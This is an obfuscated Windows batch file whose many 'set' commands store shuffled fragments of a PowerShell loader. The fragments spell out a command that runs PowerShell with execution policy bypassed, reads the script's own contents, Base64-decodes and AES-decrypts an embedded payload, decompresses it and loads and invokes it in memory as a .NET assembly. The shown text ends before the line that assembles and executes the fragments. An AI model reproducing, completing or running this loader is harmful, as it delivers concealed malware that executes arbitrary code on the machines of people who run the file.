@echo off
set "TUikdWNErE=6] -"
set "xRsheABXsm=yste"
set "KEtnOXALKi=d;$w"
set "LhkWfFQoPn=in $"
set "gcNGbgbUzY=/a3B"
set "AzSMdTceeO=ress"
set "pTEsxDLtpC== $w"
set "kargmkJOVX=O.Me"
set "YzzJoinWlg=DUGN"
set "DAOEsBOQrY=.Mem"
set "FPqJUsFlnT=ke($"
set "eJOjghqTkM=oint"
set "ripQdCZWPq=and "
set "JPFBlHvChW=();$"
set "epmhomfZLs=fH.D"
set "ktHapgSxDY=raph"
set "vjfAJxBeie=.Com"
set "ofiBcdxJUG=:: '"
set "ThhPjjZhJO=-ep "
set "cMwcNMkXTm=join"
set "dbJjaaatfT=pose"
set "nruaiZCAFa=ss -"
set "NsnWsitpdh=F'[-"
set "IjAEkwUJqT=form"
set "UqMQOWsdEu=, (,"
set "LWPeZoCPjA=.-16"
set "zAVLatQJPE=Obje"
set "OOMsVFdxlc=;$UD"
set "ADwWkArTcf=D.Pa"
set "qOPtGNcCgt=-joi"
set "FnpACNbpML==');"
set "TfXxhVXcje=Disp"
set "aBsnLkdhPG=.Mod"
set "nPfkIzggGw=7;$w"
set "pRjbGCGGnA=JJ ="
set "kFFyIaMvFm=$DxN"
set "bwEibvZXTq=.Sec"
set "AkjaiaOmqF=]::("
set "aVKslJleim=m.Re"
set "lmaNCzQuZj=tem."
set "iwZiAJUVLU=).Sp"
set "idjWdmQTwe=-1.."
set "VjAoEsviNx=gnir"
set "qGCjdLNrtm=.Ass"
set "TPsJdmCsSa=ress"
set "fobObABilj=J = "
set "gghkSPfqVa=yste"
set "GxKEWIyDDa== [S"
set "eSvtqKGFdJ=157K"
set "wsCOWSlTMi=ArMD"
set "cycqRQnqSO=-joi"
set "bFCJSzLjdI=, $T"
set "UhpxCbAkwA=)) {"
set "ruGQvtlYYj=ateD"
set "ENvivcGDgj=bypa"
set "yMCMaaGtKe=TdBJ"
set "EiqVFOATSj=nirt"
set "xnLDbQMxrA=Stre"
set "lAUemXdOOC=m(, "
set "SKvZHjySVh=ArMD"
set "dlOBVVmixI=);$w"
set "LWkdCpvfsx=rt]:"
set "LESOGZazyU=yZW."
set "BtMroDgcSV=BC;$"
set "xuyYYSEiBS=TllA"
set "HicDNzEZIu=File"
set "zXPDhxITuB=('%~f0'"
set "pufkspzbJM=le  "
set "CMFASJIVLQ=..-1"
set "fKmUTPSdrs=ddin"
set "snfcqcXHgY=ArMD"
set "ZCHTMQOYDp=('%*'"
set "YDDSksVnaG=Comp"
set "LXQrNaFyxq=$DxN"
set "JdDUBMEnlZ=em.I"
set "bCMFUxeLNZ=Nrxf"
set "AVYnOKMnBs=vert"
set "AJkmGhmZgu=UGN."
set "HDyibDTLMK=]::("
set "nyavRlJyRZ=TydU"
set "FSkNsVccHE=.Dis"
set "swDKNAbAtd=ddin"
set "YRvJOBxRfR=Invo"
set "GoIOMqVyuO=Conv"
set "gHuZCfyhzH= = $"
set "RpSeCEqpFw=tsWi"
set "ilYRgCzWjh=mory"
set "TYKNuEqQMf=);$D"
set "WjzXvOFrXW=ptog"
set "nDhbDTKuza=flec"
set "uHLYpCBBrh=-nop"
set "IWVAzBNgGj=$Tyd"
set "BbHiOKrCUC= New"
set "zRjFzCuzjS=Pwjk"
set "SAqHergLqL=kzuW"
set "PVqEaIYswj= '')"
set "ZyEFKzuGBk=ArMD"
set "FtYdNgoXRg=oB ="
set "CaMnsRzuJs=ring"
set "fbqblOYhgF=();$"
set "ULkbKmcWaY=.Con"
set "iFhhYELWBN=ion."
set "wEftCuuuFM= if "
set "cSlQxahoJI= = ["
set "pHvkEjEsqL=gMod"
set "CfJOdywtKg=kwZd"
set "SQvZWHaXXS=('da"
set "KsSQRItGSw=Star"
set "cVphWpdAUY=[]] "
set "rhtpHljGZP=yTo("
set "duqzxdwUNC='[-1"
set "ylwvKTruZL=New-"
set "CEqLsnEpaD=($kw"
set "ReKjYkkFVN= = $"
set "eQjxBCJNvL=);$N"
set "czvNWddYBV=join"
set "yLczbXDDju=P4Ia"
set "dWSBwMfHpH=ose("
set "UQbVKbVywY=M) {"
set "ghuKQdwkhF= [Sy"
set "xfuDkEsocO=rity"
set "RxdRqtGJDb=ress"
set "NaVDyVRuJj=tion"
set "nlAECOzAaD=esaB"
set "whZjNzHyEh=]::C"
set "jpIHXfMkbq=..-1"
set "tvATTZbEPo=.Cop"
set "bsZLGDZtjN=urit"
set "hlruwKsBro= [st"
set "SvdMBSDFrl=();$"
set "dZqPCYDuJt=ne);"
set "RTqDFpQQaZ=trea"
set "kUfVQLLVFG=$AXU"
set "YRiyuJqpDC=oB);"
set "etfUaXUwqy=ypto"
set "TTPOFQxoJB=yste"
set "oTrYbCPRxV=yZW "
set "lFhKxXdbMQ=.Cry"
set "qtoZfUfole=Zdf."
set "TORHGbNIOI=Mode"
set "NJoqlImeKI=esMa"
set "gsEjyfEDdA=tryP"
set "aTgRXCKvqv=dBJJ"
set "OuqOkdQDIN=TdBJ"
set "gulgMzhMhA=PKCS"
set "FxIdvwHZiR=wfBW"
set "aQeXMstaKd='h6b"
set "gYshEoVlWF=rxfH"
set "wsRcERHGeY=.IO."
set "rQBPgcMCZH=ose("
set "dYkowTDzxW=)))"
set "bpGALeMeLG=saBm"
set "HZMnFphMiu=ode]"
set "DltGRIKcqo=.Cry"
set "quYvJmDyEs=;$Pw"
set "DirVSebDXG= [Sy"
set "WflOKJFbki=;$AX"
set "QcVyJmhWEJ=$wAr"
set "sekulSNIQU=TdBJ"
set "leevpfNVrH=TuCw"
set "lVJmVPeSrc='')("
set "PmzsiLqbKk=e]::"
set "nNEcIcpfoH=th('"
set "faBukSYuKJ=)($h"
set "CumGsPpDMf=znSk"
set "MLFtLzOPjS=$TdB"
set "jAnkWrmbZh=6esa"
set "koMcKppKWG=);$U"
set "TjSyVPBWbD=raph"
set "gsbmDtFEQh=oL'["
set "ycEckYFFmG=.Len"
set "AzFDdOctqU=Wg, "
set "zQtglUvoye=.Key"
set "HrxUGUJzVE=SoYj"
set "bwimxMjOWG=] -j"
set "yGoRjTYpOx=ptor"
set "kPCORYaAQz=tem."
set "JujWQxtRzO=('KY"
set "vjlKRtoQpq=dBJJ"
set "pHAfnHPepQ=f.Su"
set "qbqTfLoJHv=ment"
set "xblPmvajjf=J, 0"
set "ZTnOfeJSFz=[Env"
set "dIKFPKgPHB=J = "
set "dRIBuEhMrW=onve"
set "RSGjVwGqNZ= = N"
set "owpcdDUuRK=;$LW"
set "tTImyJVPZx=ecry"
set "mZlDsjqyti=2Q+X"
set "acqlzRjJtW=ewLi"
set "WwSIqFvnrc=bjec"
set "ttyfKuJJml=Ti8L"
set "VOdoHYWQhN=[Sys"
set "TqrTmRCfDd=ect "
set "AfYhuYFczs=$Nrx"
set "IqcPFaUhRp=pher"
set "TPHeQhmeMK===')"
set "AfWdHTkTTB=gth)"
set "omiqvfvphH=lBlo"
set "bteAraVLmo=comp"
set "azjjfUNKJE=rtS4"
set "YzgweVKrNl=V = "
set "fdPJNZahUp=y]::"
set "iFXBYDdjDF=ArMD"
set "JCreEBgfYr=pres"
set "JFjiucKjFn=[IO."
set "EQIOQWOPiO=  $h"
set "qgIfjpZqzw=Fina"
set "vJuYJlWbNg= '')"
set "KFwduGYvtf=-4] "
set "oYQwzXbGAu=.GZi"
set "aGLosgErfM=stem"
set "QibhBnDSNo=1..-"
set "XviiUHDzlq=Etk/"
set "OSPLROVnGL=-Obj"
set "KOJuftwTGq=ZW.T"
set "bgsaZvzCCY=null"
set "AzDKnIhNGA=oryS"
set "gBrkGbKTAM=y.Pa"
set "PkkHybnHZn=sion"
set "wQigfHycPX=.Dis"
set "srkqkJSoIt=Bmor"
set "RqwaqzZUVY=ispo"
set "BEJKmliRTE=daeR"
set "mdzrvPNDjg=Secu"
set "DrDlKjIYQU=UWg."
set "rXKRQWLJIG=gN+y"
set "vlsSCKqHCc=Syst"
set "wqzMpnOhTt=($kw"
set "NeUOMWyhhz=9tpc"
set "naiQrDsIyQ=pStr"
set "tvFqKYsKVS=iOdg"
set "zbMHLsLhyG=mMK4"
set "MvVoDZyJdn=.Cre"
set "pNGVjygoLU=3); "
set "tyFsTiGQdU=t Sy"
set "noTESvUmGr=am;$"
set "cYeEQOSmPa=:('g"
set "myARQHrwBl=pose"
set "BGTkXtHkMf=tS46"
set "JDdLEDnKpd=nage"
set "CQiscMKOam=ert]"
set "VKPTNdcmzy=g = "
set "nImqlRoLTR=ptog"
set "xGqBmnDDhI=ing("
set "ptRJMtXMuf=brea"
set "QLYyoVOPDE=stem"
set "QhBThAWXSW=)($T"
set "OBniQWTQvy=[-1."
set "RhYsveOGOS=$TdB"
set "xuvqNqMNlM=embl"
set "czSEojzyml=comm"
set "PGjpZNVmKe=jkR "
set "hBuCJlZxaf=[Sys"
set "QxibZoKetn=ach "
set "ZrzxAsoPSb=m.IO"
set "mPrwMfmXPG=;$LW"
set "rGnvuqpYFI=rofi"
set "dwBbsnmlFG=y.Ci"
set "VteMJoETuq=wArM"
set "EngOZipaBo=e = "
set "kmbmYVJBvI=R.En"
set "aRvycBofjI=ck($"
set "jUuSlIpTZv=16] "
set "yUqSitmxeM=::De"
set "UjhXuXvJmL=bstr"
set "gpzUtwrLlB=rans"
set "ADLhPkqora='txe"
